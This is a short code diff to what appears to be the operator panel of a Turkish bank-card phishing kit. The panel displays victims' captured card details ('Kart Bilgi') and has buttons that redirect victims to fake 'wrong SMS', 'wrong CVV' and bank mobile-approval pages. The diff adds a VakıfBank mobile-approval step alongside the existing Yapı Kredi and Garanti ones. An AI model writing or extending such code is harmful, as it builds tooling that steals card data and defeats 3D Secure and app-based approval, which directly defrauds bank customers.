@@ -687,6 +687,9 @@ Kart Bilgi: ${cardDetails}`;
       case 'GARANTİ MOBİL ONAY':
       case 'GARANTI MOBIL ONAY':
         return 'bg-emerald-600 text-white';
+      case 'VAKIFBANK MOBİL ONAY':
+      case 'VAKIFBANK MOBIL ONAY':
+        return 'bg-orange-500 text-white';
       case '3D SMS':
         return 'bg-purple-600 text-white';
       default:
@@ -699,6 +702,7 @@ Kart Bilgi: ${cardDetails}`;
     { key: 'HATALI_SMS', label: 'HATALI SMS', icon: '❌', color: '#dc2626' },
     { key: 'YKB_MOBIL_ONAY', label: 'YKB Mobil Onay', icon: '📲', color: '#0284c7' },
     { key: 'GARANTI_MOBIL_ONAY', label: 'Garanti Mobil Onay', icon: '📲', color: '#008542' },
+    { key: 'VAKIF_MOBIL_ONAY', label: 'Vakıf Mobil Onay', icon: '📲', color: '#f59e0b' },
     { key: 'INT_KAPALI', label: 'İNT KAPALI', icon: '🔒', color: '#4b5563' },
     { key: 'PROVIZYON', label: 'Skt / Cvv Hatalı', icon: '💳', color: '#2563eb96' },
     { key: 'BAN', label: 'BAN', icon: '🚫', color: '#ea580cab' },
@@ -1132,6 +1136,8 @@ Kart Bilgi: ${cardDetails}`;
                               content = '📲 YKB Mobil Onay';
                             } else if (path.includes('/odeme/garanti-mobil-onay')) {
                               content = '📲 Garanti Mobil Onay';
+                            } else if (path.includes('/odeme/vakif-mobil-onay')) {
+                              content = '📲 Vakıf Mobil Onay';
                             } else if (path.includes('/odeme/tebrikler')) {
                               content = '🎉 Tebrikler';
                             } else if (path.includes('/odeme')) {
